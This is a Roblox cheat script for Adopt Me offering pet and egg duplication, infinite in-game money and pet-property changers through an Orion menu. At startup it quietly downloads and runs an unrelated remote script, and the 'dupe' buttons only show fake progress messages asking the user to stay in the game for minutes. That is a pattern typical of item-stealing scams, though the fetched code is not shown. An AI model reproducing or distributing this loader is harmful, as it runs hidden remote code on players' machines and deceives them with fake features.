local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "SplishyScript🎩-Adopt-Me-[Ver-5.0]", HidePremium = false, IntroText = "SplishyScript", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
OrionLib:MakeNotification({
	Name = "Loading The Script..",
	Content = "May Take 20-30 seconds this is not the exact lodaing time❗",
	Image = "rbxassetid://18170549235",
	Time = 20
})
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ultra-Scripts/AdoptmeScript/main/AdoptmeScript/JYBRND6-adopt-me.lua"))()
wait(1)
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "SplishyScript🎩-Adopt-Me-[Ver-5.0]", HidePremium = false, IntroText = "HS SplishyScript", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
local Tab = Window:MakeTab({
    Name = "Dupe Eggs 🥚",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
OrionLib:MakeNotification({
	Name = "Script Successfully Loaded",
	Content = "Loading Has been successful ",
	Image = "rbxassetid://17849312358",
	Time = 30
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "Equip Eggs To Dupe",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Egg Selector",
	Content = "Egg Equipped Selected",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddButton({
	Name = "Click To Dupe Eggs",
	Callback = function()
OrionLib:MakeNotification({
	Name = "Duping Eggs....",
	Content = "Duping is in process..[Takes around 4-5 minutes] Dont Leave The Game ❗",
	Image = "rbxassetid://4483345998",
	Time = 120
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})
Tab:AddParagraph("Not Working?❗","Dupe Eggs Not Working? Check if u are on a private server this probably causes the error.")
Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Tiktok Is HS SplishyScript🎩")

local Tab = Window:MakeTab({
    Name = "AutoFarm 🚜",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Autofarm Source 🧑‍🌾","With Updated Features Autofarm Pony-Minigame And Bullride-Minigame Also With Petfarms And Baby Farms")
Tab:AddButton({
    Name = "Click To Load AutoFarm Source 🚜",
    Callback = function()
              loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
      end    
})
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Tiktok Is HS SplishyScript🎩") 

local Tab = Window:MakeTab({
    Name = "Dupe Pets 🔨",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "Equip a pet u want to dupe❗",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Selected Equipped Pets",
	Content = "Equipped Pets Successfully Selected",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddButton({
	Name = "Click To Dupe Pets 🎯",
	Callback = function()
	OrionLib:MakeNotification({
	Name = "Duping Pets...",
	Content = "Duping in Process..[Takes Around 4-5 minutes] Dont Leave The Game❗",
	Image = "rbxassetid://4483345998",
	Time = 120
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})
Tab:AddParagraph("Not Working?❗","Dupe Pets Not Working? Check if u are on a private server this probably causes the error.")
Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, HS SplishyScript🎩")

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
    Name = "Infinite Bucks 💸",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
    Name = "Click to load Infinite Bucks 💸",
    Callback = function()
              require(game:service'ReplicatedStorage'.Fsys).load("ClientData").update("money",(15999999984/16))
      end    
})

Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Tiktok Is HS SplishyScript🎩")

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

local Tab = Window:MakeTab({
    Name = "MFR-NFR 📦",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
    Name = "MFR Changer-(Inventory🎒)",
    Callback = function()
              while true do
   wait()
local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
for i,v in pairs(playerData.inventory.pets) do
v.properties.rideable = true
v.properties.flyable = true
v.properties.mega_neon = true
end
end
      end    
})

Tab:AddButton({
    Name = "NFR Changer-(Inventory🎒)",
    Callback = function()
              while true do
   wait()
local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
for i,v in pairs(playerData.inventory.pets) do
v.properties.rideable = true
v.properties.flyable = true
v.properties.neon = true
end
end
      end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Tiktok Is HS SplishyScript🎩")


local Tab = Window:MakeTab({
    Name = "Errors/Bugs?❗",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddParagraph("Private server Error❗","Being in a private server can cause alot of the main features of the script to not work please take this as a note if ur having problems with something not working this is probably the cause of it")
Tab:AddParagraph("My Discord server 🎩","Please join my discord server if u need help with bugs/errors.")
Tab:AddButton({
	Name = "Copy Link To Discord Server 🎯",
	Callback = function()
    setclipboard("https://discord.com/invite/ptHCGYjmSQ")
      		print("button pressed")
  	end    
})
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]